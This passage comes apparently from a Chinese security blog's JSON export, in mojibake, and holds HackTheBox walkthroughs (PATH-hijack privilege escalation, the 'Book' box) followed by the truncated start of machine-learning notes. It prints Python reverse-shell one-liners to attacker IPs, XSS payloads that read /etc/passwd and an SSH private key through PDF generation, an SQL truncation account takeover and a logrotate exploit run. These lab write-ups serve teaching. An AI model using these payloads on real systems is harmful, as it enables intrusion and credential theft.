groups&#x3D;1000(theseus),100(users) Getting Root Access æŸ¥æ‰¾SUIDæ–‡ä»¶ï¼š 1234567891011121314151617181920theseus@ubuntu:~&#x2F;.ssh$ find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null&#x2F;usr&#x2F;sbin&#x2F;pppd&#x2F;usr&#x2F;bin&#x2F;newgrp&#x2F;usr&#x2F;bin&#x2F;passwd&#x2F;usr&#x2F;bin&#x2F;chfn&#x2F;usr&#x2F;bin&#x2F;gpasswd&#x2F;usr&#x2F;bin&#x2F;sudo&#x2F;usr&#x2F;bin&#x2F;pkexec&#x2F;usr&#x2F;bin&#x2F;chsh &#x2F;usr&#x2F;bin&#x2F;traceroute6.iputils&#x2F;usr&#x2F;bin&#x2F;arping&#x2F;usr&#x2F;bin&#x2F;vmware-user-suid-wrapper&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign...&#x2F;bin&#x2F;umount&#x2F;bin&#x2F;fusermount&#x2F;bin&#x2F;sysinfo&#x2F;bin&#x2F;mount&#x2F;bin&#x2F;su&#x2F;bin&#x2F;ping å¯ä»¥å‘ç°ä¸€ä¸ªä¸å¤ªå¯»å¸¸SUIDï¼šsysinfo 123theseus@ubuntu:~$ file &#x2F;bin&#x2F;sysinfofile &#x2F;bin&#x2F;sysinfo&#x2F;bin&#x2F;sysinfo: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;l, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]&#x3D;9e9d26d004da0634c0747d16d377cd2a934e565a, not stripped è¿è¡Œ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768theseus@ubuntu:~$ sysinfosysinfo&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Hardware Info&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;H&#x2F;W path Device Class Description&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; system VMware Virtual Platform&#x2F;0 bus 440BX Desktop Reference Platform&#x2F;0&#x2F;0 memory 86KiB BIOS&#x2F;0&#x2F;1 processor AMD EPYC 7401P 24-Core Processor&#x2F;0&#x2F;1&#x2F;0 memory 16KiB L1 cache&#x2F;0&#x2F;1&#x2F;1 memory 16KiB L1 cache&#x2F;0&#x2F;100&#x2F;17.5 bridge PCI Express Root Port&#x2F;0&#x2F;100&#x2F;17.6 bridge PCI Express Root Port&#x2F;0&#x2F;100&#x2F;17.7 bridge PCI Express Root Port&#x2F;0&#x2F;100&#x2F;18 bridge PCI Express Root Port&#x2F;0&#x2F;100&#x2F;18.1 bridge PCI Express Root Port&#x2F;0&#x2F;100&#x2F;18.2 bridge PCI Express Root Port&#x2F;0&#x2F;100&#x2F;18.3 bridge PCI Express Root Port&#x2F;0&#x2F;100&#x2F;18.4 bridge PCI Express Root Port&#x2F;0&#x2F;100&#x2F;18.5 bridge PCI Express Root Port&#x2F;0&#x2F;100&#x2F;18.6 bridge PCI Express Root Port&#x2F;0&#x2F;100&#x2F;18.7 bridge PCI Express Root Port&#x2F;0&#x2F;46 scsi0 storage &#x2F;0&#x2F;46&#x2F;0.0.0 &#x2F;dev&#x2F;cdrom disk VMware IDE CDR00&#x2F;1 system &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Disk Info&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Disk &#x2F;dev&#x2F;loop0: 3.7 MiB, 3825664 bytes, 7472 sectorsUnits: sectors of 1 * 512 &#x3D; 512 bytesSector size (logical&#x2F;physical): 512 bytes &#x2F; 512 bytesI&#x2F;O size (minimum&#x2F;optimal): 512 bytes &#x2F; 512 bytesDisk &#x2F;dev&#x2F;loop1: 54.5 MiB, 57151488 bytes, 111624 sectorsUnits: sectors of 1 * 512 &#x3D; 512 bytesSector size (logical&#x2F;physical): 512 bytes &#x2F; 512 bytesI&#x2F;O size (minimum&#x2F;optimal): 512 bytes &#x2F; 512 bytesDisk &#x2F;dev&#x2F;loop11: 3.7 MiB, 3862528 bytes, 7544 sectorsUnits: sectors of 1 * 512 &#x3D; 512 bytesSector size (logical&#x2F;physical): 512 bytes &#x2F; 512 bytesI&#x2F;O size (minimum&#x2F;optimal): 512 bytes &#x2F; 512 bytes&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;CPU Info&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;processor : 0vendor_id : AuthenticAMDcpu family : 23model : 1model name : AMD EPYC 7401P 24-Core Processorstepping : 2microcode : 0x8001230cpuid level : 13wp : yesflags : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt sha_ni xsaveopt xsavec xsaves clzero arat overflow_recov succorbugs : fxsave_leak sysret_ss_attrs null_seg spectre_v1 spectre_v2 spec_store_bypassbogomips : 4000.00TLB size : 2560 4K pagesclflush size : 64cache_alignment : 64address sizes : 43 bits physical, 48 bits virtualpower management:&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;MEM Usage&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; total used free shared buff&#x2F;cache availableMem: 3.8G 566M 2.4G 4.0M 929M 3.1GSwap: 947M 0B 947M sysinfoæ˜¾ç¤ºå‡ºæ¥çš„å†…å®¹ä¸»è¦åˆ†ä¸ºå››ä¸ªéƒ¨åˆ† Hardware Info Disk Info CPU Info Mem Usage æŸ¥é˜…äº†Forumä¸Šå‰è¾ˆä»¬ç»™çš„æç¤ºï¼Œå‘ç°sysinfoæ˜¯å››ä¸ªLinuxå‘½ä»¤çš„ç»„åˆè°ƒç”¨ï¼š Hardware Info = lshw -short Disk Info = fdisk -l CPU Info = cat /proc/cpuinfo Mem Usage = free -h æ—¢ç„¶sysinfoè°ƒç”¨çš„æ˜¯åŸç”Ÿçš„Linuxå‘½ä»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ”¹å˜PATHå˜é‡ï¼Œåˆ›å»ºä¸€ä¸ªå†…å®¹ç”±è‡ªå·±å†³å®šï¼Œæ–‡ä»¶åä¸ºä¸Šé¢å››ç§ä»»æ„ä¸€ä¸ªçš„â€œäºŒè¿›åˆ¶æ–‡ä»¶â€ï¼Œå…·ä½“è€Œè¨€ï¼š åœ¨/tmp/magicç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªfdiskæ–‡ä»¶ï¼Œç„¶åå‘å…¶ä¸­å†™å…¥reverse shellï¼š 1234theseus@ubuntu:&#x2F;tmp&#x2F;magic$ touch fdisktouch fdisktheseus@ubuntu:&#x2F;tmp&#x2F;magic$ echo python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.4&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39; &gt; fdisk&lt;(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39; &gt; fdisk æ›´æ”¹æƒé™755 1theseus@ubuntu:&#x2F;tmp&#x2F;magic$ chmod fdisk 755 ç„¶åå°†/tmp/magicç›®å½•å†™åˆ°PATHç¯å¢ƒå˜é‡ä¸­ï¼š 12theseus@ubuntu:&#x2F;tmp&#x2F;magic$ export PATH&#x3D;&#x2F;tmp&#x2F;magic:$PATHexport PATH&#x3D;&#x2F;tmp&#x2F;magic:$PATH æ›´è¯¦ç»†çš„è§£é‡Šå¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ï¼šhttps://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/ è¿™æ ·å°±è¾¾åˆ°äº†ç›®çš„ï¼Œå³sysinfoä¼šå»æ‰§è¡Œ/tmp/magicç›®å½•ä¸‹çš„fdisk æœ¬æœºç›‘å¬1234ç«¯å£ï¼Œé¶æœºè¿è¡Œsysinfoå‘½ä»¤ï¼š 12345Ncat: Connection from 10.10.10.185:45410.python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;root@ubuntu:&#x2F;tmp# whoamiwhoamiroot 0x04 Summary åˆ©ç”¨SQL Injectionç™»å½•ä¸Šä¼ å›¾ç‰‡é¡µé¢ ä½¿ç”¨exiftoolå·¥å…·å‘æ­£å¸¸å›¾ç‰‡æ·»åŠ web shell ä¸Šä¼ å›¾ç‰‡è·å¾—www-dataçš„reverse shell ä»db.php5è·å¾—MySQLæ•°æ®åº“çš„ç™»å½•åå’Œå¯†ç  ä½¿ç”¨mysqldumpå¤‡ä»½æ•°æ®åº“ï¼Œå¾—åˆ°ç½‘ç«™çš„adminå¯†ç ï¼Œå³ç”¨æˆ·theseusçš„suå¯†ç  åˆ†æsysinfoçš„è¾“å‡ºä¿¡æ¯ ä½¿ç”¨PATHå˜é‡ææƒ","tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"HTB","permalink":"http://ca0y1h.top/tags/HTB/"}],"categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HTB::Book-walkthrough","date":"2020-04-15T02:50:14.000Z","path":"Target_drone/HackTheBox/14.HTB-Book-walkthrough/","text":"HTB::Book Walkthrough 0x01 Info Card 0x02 Tools and Tips nmap dirb pspy SQL Truncate XSS LFI logrotate exp 0x03 Pentesting Initial Enumeration ç«¯å£æ‰«æ 123456789101112131415161718192021# Nmap 7.80 scan initiated Fri Apr 3 22:48:24 2020 as: nmap -sC -sV -Pn -oN ippsec_scan.txt 10.10.10.176Nmap scan report for 10.10.10.176Host is up (0.43s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)| 256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)|_ 256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)80&#x2F;tcp open http Apache httpd 2.4.29 ((Ubuntu))| http-cookie-flags: | &#x2F;: | PHPSESSID: |_ httponly flag not set|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)|_http-title: LIBRARY - Read | Learn | Have FunService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernelService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .# Nmap done at Fri Apr 3 22:49:38 2020 -- 1 IP address (1 host up) scanned in 73.80 seconds è·¯å¾„æ‰«æ 1234567891011121314151617181920212223242526272829303132333435363738$ dirb http:&#x2F;&#x2F;10.10.10.176 -----------------DIRB v2.22By The Dark Raver----------------- START_TIME: Tue Apr 14 02:23:14 2020URL_BASE: http:&#x2F;&#x2F;10.10.10.176&#x2F;WORDLIST_FILES: &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;common.txt----------------- GENERATED WORDS: 4612---- Scanning URL: http:&#x2F;&#x2F;10.10.10.176&#x2F; ----&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.176&#x2F;docs&#x2F;&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.176&#x2F;images&#x2F;+ http:&#x2F;&#x2F;10.10.10.176&#x2F;index.php (CODE:200|SIZE:6800)+ http:&#x2F;&#x2F;10.10.10.176&#x2F;server-status (CODE:403|SIZE:277)---- Entering directory: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F; ----&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;export&#x2F;+ http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;index.php (CODE:200|SIZE:6291)&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;vendor&#x2F;---- Entering directory: http:&#x2F;&#x2F;10.10.10.176&#x2F;docs&#x2F; -------- Entering directory: http:&#x2F;&#x2F;10.10.10.176&#x2F;images&#x2F; -------- Entering directory: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;export&#x2F; -------- Entering directory: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;vendor&#x2F; ----&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;vendor&#x2F;composer&#x2F;---- Entering directory: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;vendor&#x2F;composer&#x2F; ---------------------END_TIME: Tue Apr 14 04:45:39 2020DOWNLOADED: 32284 - FOUND: 4 Getting User Access æŸ¥çœ‹80ç«¯å£ï¼Œæœ‰ä¸€ä¸ªç™»å½•å’Œæ³¨å†Œé¡µé¢ï¼Œæˆ‘ä»¬å…ˆæ­£å¸¸æ³¨å†Œå’Œç™»å½•ä¹‹åè¿›ç«™ç‚¹çœ‹çœ‹ï¼Œæœ‰ä¸‰ä¸ªç‚¹å€¼å¾—æ³¨æ„ï¼š Contact Usç•Œé¢è¡¨æ˜äº†æœ‰ä¸€ä¸ªç®¡ç†å‘˜è´¦å·admin@book.htb View Profileç•Œé¢è¡¨æ˜äº†ç°åœ¨è´¦å·çš„æƒé™æ˜¯User Collectionsç•Œé¢æœ‰ä¸€ä¸ªä¸Šä¼ åŠŸèƒ½ é¦–å…ˆå°è¯•èƒ½ä¸èƒ½å‚ç›´è¶Šæƒï¼Œç”¨admin@book.htbæ³¨å†Œè´¦å·ï¼ŒBurpæ‹¦æˆªè¯·æ±‚ 1234567891011121314POST &#x2F;index.php HTTP&#x2F;1.1Host: 10.10.10.176User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8Accept-Language: en-US,en;q&#x3D;0.5Accept-Encoding: gzip, deflateReferer: http:&#x2F;&#x2F;10.10.10.176&#x2F;index.phpContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 49Connection: closeCookie: PHPSESSID&#x3D;mq1sob5pmstq0i55csvmlafcreUpgrade-Insecure-Requests: 1name&#x3D;admin&amp;email&#x3D;admin@book.htb&amp;password&#x3D;123321 å¹¶ä¸”æŸ¥çœ‹æ³¨å†Œé¡µé¢æºç å‘ç°emailå­—æ®µæœ‰JSéªŒè¯ 123456789101112function validateForm() &#123; var x = document.forms[&quot;myForm&quot;][&quot;name&quot;].value; var y = document.forms[&quot;myForm&quot;][&quot;email&quot;].value; if (x == &quot;&quot;) &#123; alert(&quot;Please fill name field. Should not be more than 10 characters&quot;); return false; &#125; if (y == &quot;&quot;) &#123; alert(&quot;Please fill email field. Should not be more than 20 characters&quot;); return false; &#125;&#125; è¿™é‡Œçš„è¶Šæƒæ–¹å¼ï¼šåœ¨admin@book.htbåé¢ç”¨ç©ºæ ¼å¡«å……è‡³20ä¸ªå­—ç¬¦åœ¨åŠ ä¸Šä¸€ä¸ªä»»æ„å­—ç¬¦ï¼Œä¸€å…±21ä¸ªå­—ç¬¦ã€‚ 1name&#x3D;admin&amp;email&#x3D;admin@book.htb C&amp;password&#x3D;123321 æ³¨å†ŒæˆåŠŸåï¼Œç”¨admin@book.htbç™»å½•ç«™ç‚¹ï¼Œå‘ç°è‡ªå·±çš„èº«ä»½ä»ç„¶æ˜¯Userï¼Œè½¬è€Œåˆ°http://10.10.10.176/adminé¡µé¢ç™»å½•ï¼Œç„¶è€Œç»“æœæ˜¯Nopeï¼ŒçŒœæµ‹ä¸€ä¸‹åŸå› å¯èƒ½æ˜¯å› ä¸ºnameå­—æ®µé‡å¤ï¼Œå†é‡æ–°èµ°ä¸€éæ³¨å†Œæµç¨‹ï¼š 1name&#x3D;admin2&amp;email&#x3D;admin@book.htb C&amp;password&#x3D;123321 ç™»å½•adminç«™ç‚¹æˆåŠŸã€‚æ¥ç€å¼€å§‹å°è¯•Collectionsæ¨¡å—ï¼Œåœ¨ç”¨æˆ·ç«¯ä¸Šä¼ ä¸€ä¸ªpdfæ–‡ä»¶ï¼Œå†…å®¹éšæ„ åœ¨ç®¡ç†é¢æ¿ä¸­ä¸‹è½½Collections PDF å¯ä»¥çœ‹åˆ°åˆšåˆšä¸Šä¼ çš„pdfæ–‡ä»¶ æ¢³ç†ä¸€ä¸‹é€»è¾‘ï¼Œæˆ‘ä»¬æä¾›çš„æ•°æ®å¯ä»¥å‘ˆç°åœ¨pdfä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡XSSæå–æœ¬åœ°æ–‡ä»¶ã€‚Googleä¸€ä¸‹LFI XSSï¼ŒNoob-ninjaå·²ç»æä¾›äº†ç›¸å…³çš„åˆ©ç”¨æ–¹å¼ï¼šhttps://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html payloadï¼š 1&lt;script&gt;x=new XMLHttpRequest;x.onload=function()&#123;document.write(this.responseText)&#125;;x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);x.send();&lt;/script&gt; ä¸Šä¼ ä¹‹åå†ä»ç®¡ç†é¢æ¿ä¸‹è½½Collections PDF æˆåŠŸæ‹¿åˆ°ä¸€ä¸ªç”¨æˆ·åreaderï¼Œå†å»ä¸»ç›®å½•æ‹¿SSH key payloadï¼š 1&lt;script&gt;x=new XMLHttpRequest;x.onload=function()&#123;document.write(this.responseText)&#125;;x.open(&quot;GET&quot;,&quot;file:///home/reader/.ssh/id_rsa&quot;);x.send();&lt;/script&gt; ä½†æ˜¯PDFæ˜¾ç¤ºæœ‰é—®é¢˜ï¼Œç”¨pdfminner.sixå·¥å…·è½¬æ¢æˆtext https://github.com/pdfminer/pdfminer.six 1$ python3 tools&#x2F;pdf2text.py 68498.pdf &gt; id_rsa SSH reader login 12345678910111213141516171819202122232425262728293031323334$ssh -i id_rsa.txt reader@book.htbThe authenticity of host &#39;book.htb (10.10.10.176)&#39; can&#39;t be established.ECDSA key fingerprint is SHA256:QRw8pCXg7E8d9sWI+0Z9nZxClJiq9&#x2F;eAeT&#x2F;9wUfoQQk.Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yesWarning: Permanently added &#39;book.htb&#39; (ECDSA) to the list of known hosts.Welcome to Ubuntu 18.04.2 LTS (GNU&#x2F;Linux 5.4.1-050401-generic x86_64) * Documentation: https:&#x2F;&#x2F;help.ubuntu.com * Management: https:&#x2F;&#x2F;landscape.canonical.com * Support: https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage System information as of Mon Mar 2 15:30:16 UTC 2020 System load: 0.28 Processes: 194 Usage of &#x2F;: 27.1% of 19.56GB Users logged in: 1 Memory usage: 39% IP address for ens33: 10.10.10.176 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https:&#x2F;&#x2F;ubuntu.com&#x2F;livepatch114 packages can be updated.0 updates are security updates.Failed to connect to https:&#x2F;&#x2F;changelogs.ubuntu.com&#x2F;meta-release-lts. Check your Internet connection or proxy settingsLast login: Tue Apr 14 06:05:21 2020 from 10.10.17.235reader@book:~$ iduid&#x3D;1000(reader) gid&#x3D;1000(reader) groups&#x3D;1000(reader)reader@book:~$ lsbackups lse.sh user.txt Getting Root Access ä¸»ç›®å½•ä¸‹æœ‰ä¸€ä¸ªbackupsæ–‡ä»¶å¤¹ï¼š 123456789reader@book:~$ cd backups&#x2F;reader@book:~&#x2F;backups$ ls -latotal 12drwxr-xr-x 2 reader reader 4096 Jan 29 13:05 .drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 ..-rw-r--r-- 1 reader reader 0 Jan 29 13:05 access.log-rw-r--r-- 1 reader reader 91 Jan 29 13:05 access.log.1reader@book:~&#x2F;backups$ cat access.log.1 192.168.0.104 - - [29&#x2F;Jun&#x2F;2019:14:39:55 +0000] &quot;GET &#x2F;robbie03 HTTP&#x2F;1.1&quot; 404 446 &quot;-&quot; &quot;curl&quot; ç”¨pspyç›‘æ§é¶æœºè¿è¡Œçš„æœåŠ¡ï¼š 12342020&#x2F;04&#x2F;14 10:17:39 CMD: UID&#x3D;0 PID&#x3D;78202 | sleep 5 2020&#x2F;04&#x2F;14 10:17:44 CMD: UID&#x3D;0 PID&#x3D;78205 | &#x2F;usr&#x2F;sbin&#x2F;logrotate -f &#x2F;root&#x2F;log.cfg 2020&#x2F;04&#x2F;14 10:17:44 CMD: UID&#x3D;0 PID&#x3D;78204 | &#x2F;bin&#x2F;sh &#x2F;root&#x2F;log.sh 2020&#x2F;04&#x2F;14 10:17:44 CMD: UID&#x3D;0 PID&#x3D;78206 | sleep 5 å¦‚æœlogrotateæ˜¯ä»¥rootèº«ä»½è¿è¡Œï¼Œå¹¶ä¸”æ™®é€šç”¨æˆ·å¯¹logrotateè½®è¯¢çš„æ—¥å¿—æ–‡ä»¶å…·æœ‰å†™çš„æƒé™ï¼Œé‚£ä¹ˆå°±æœ‰ä¸€ç§æ¼æ´åˆ©ç”¨å¯ä»¥ææƒã€‚æˆ‘ä»¬å…ˆæ¥éªŒè¯ä¸€ä¸‹access.logæ˜¯ä¸æ˜¯è½®è¯¢çš„æ–‡ä»¶ï¼Œå‘å…¶ä¸­å†™å…¥10Mçš„éšæœºæ¯”ç‰¹æµæ•°æ®ï¼š 1234567891011121314reader@book:~&#x2F;backups$ head -c 10M &lt; &#x2F;dev&#x2F;urandom &gt; access.logreader@book:~&#x2F;backups$ ls -latotal 10252drwxr-xr-x 2 reader reader 4096 Jan 29 13:05 .drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 ..-rw-r--r-- 1 reader reader 10485760 Apr 15 02:35 access.log-rw-r--r-- 1 reader reader 91 Jan 29 13:05 access.log.1reader@book:~&#x2F;backups$ ls -latotal 10252drwxr-xr-x 2 reader reader 4096 Apr 15 02:35 .drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 ..-rw-r--r-- 1 reader reader 0 Apr 15 02:35 access.log-rw-r--r-- 1 reader reader 10485760 Apr 15 02:35 access.log.1-rw-r--r-- 1 reader reader 91 Jan 29 13:05 access.log.2 å¾ˆæ˜æ˜¾ï¼Œå¤šäº†ä¸€ä¸ªaccess.log.2æ—¥å¿—æ–‡ä»¶ã€‚ ä»https://github.com/whotwagner/logrottenä¸‹è½½logrotate exploitåˆ°æœ¬æœºï¼Œä¸Šä¼ è‡³é¶æœºçš„ä¸»ç›®å½•å¹¶ç¼–è¯‘ï¼š 1reader@book:~ gcc -o logrotten logrotten.c å†å‡†å¤‡ä¸€ä¸ªpayloadfileï¼Œå†™å…¥reverse shellï¼Œåœ¨æœ¬æœºç›‘å¬4444ç«¯å£ 12reader@book:~ cat payloadfilepython -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.55&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39; ç„¶åæ‰§è¡Œexploit 12reader@book:~ .&#x2F;logrotten -p .&#x2F;payloadfile &#x2F;home&#x2F;reader&#x2F;backups&#x2F;access.logWaiting for rotating backups&#x2F;access.log... äºæ­¤åŒæ—¶ï¼Œåœ¨å¦å¤–ä¸€ä¸ªç»ˆç«¯ç™»å½•é¶æœºï¼Œå‘è½®è¯¢æ—¥å¿—ä¸­å†™å…¥éšæœºæ•°æ®ï¼Œè§‚å¯Ÿä¸»æœº4444ç«¯å£ï¼š 12345$nc -nlvp 1234listening on [any] 1234 ...connect to [10.10.15.152] from (UNKNOWN) [10.10.10.176] 50008# cat &#x2F;root&#x2F;root.txt84da9--------------------0dd89714 0x04 Reference https://github.com/whotwagner/logrotten https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html","tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"é¶æœº/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"Machine-Learning-Week3","date":"2020-04-09T02:15:46.000Z","path":"Machine_learning/basic_learning/3.Machine-Learning-Week3/","text":"è¿™ä¸€ç¯‡ä¸»è¦æ€»ç»“é€»è¾‘å›å½’ç›¸å…³çŸ¥è¯†ç‚¹ Machine Learning Week3 0x01 å‡è®¾è¡¨ç¤º(Hypothesis Representation) é€»è¾‘å›å½’ç®—æ³•çš„å‡è®¾å‡½æ•° hÎ¸(x) ç”±ä»¥ä¸‹è¡¨è¾¾å¼ç»„æˆï¼š $$ \\begin{align*}&amp; h_\\theta (x) = g ( \\theta^T x ) \\newline \\newline&amp; z = \\theta^T x \\newline&amp; g(z) = \\dfrac{1}{1 + e^{-z}}\\end{align*} $$ å…¶ä¸­g(z) ç§°ä¸ºé€»è¾‘å‡½æ•°ï¼ˆLogistic Functionï¼‰ï¼Œåˆç§°ä¸º Sigmoid Functionã€‚ è¯¥å‡½æ•°çš„å›¾åƒä¸ºï¼š hÎ¸(x) çš„ä½œç”¨æ˜¯ï¼Œå¯¹äºç»™å®šçš„è¾“å…¥å˜é‡ï¼Œæ ¹æ®é€‰æ‹©çš„å‚æ•°è®¡ç®—è¾“å‡ºå˜é‡=1çš„å¯èƒ½æ€§ï¼Œå³hÎ¸(x) = P(y=0|x;Î¸) ï¼Œä¾‹å¦‚ï¼Œå¦‚æœå¯¹äºç»™å®šçš„xï¼Œé€šè¿‡å·²ç»ç¡®å®šçš„å‚æ•°è®¡ç®—å¾—å‡ºhÎ¸(x) = 0.7ï¼Œåˆ™è¡¨ç¤ºæœ‰70%çš„å‡ ç‡yä¸ºæ­£å‘ç±»ï¼Œç›¸åº”åœ°ä¸ºè´Ÿå‘ç±»çš„å‡ ç‡ä¸º1-0.7=0.3ã€‚ 0x02 åˆ¤å®šè¾¹ç•Œ(Decision Boundary) åœ¨é€»è¾‘å›å½’ä¸­ï¼Œæˆ‘ä»¬é¢„æµ‹ï¼š å½“ hÎ¸(x) &gt;= 0.5æ—¶ï¼Œé¢„æµ‹y=1; å½“ hÎ¸(x) &lt; 0.5æ—¶ï¼Œé¢„æµ‹y=0; æ ¹æ®Så½¢å‡½æ•°å›¾åƒï¼Œå½“ z = 0æ—¶ï¼Œg(z) = 0.5; z &gt; 0æ—¶ï¼Œg(z) &gt; 0.5; z 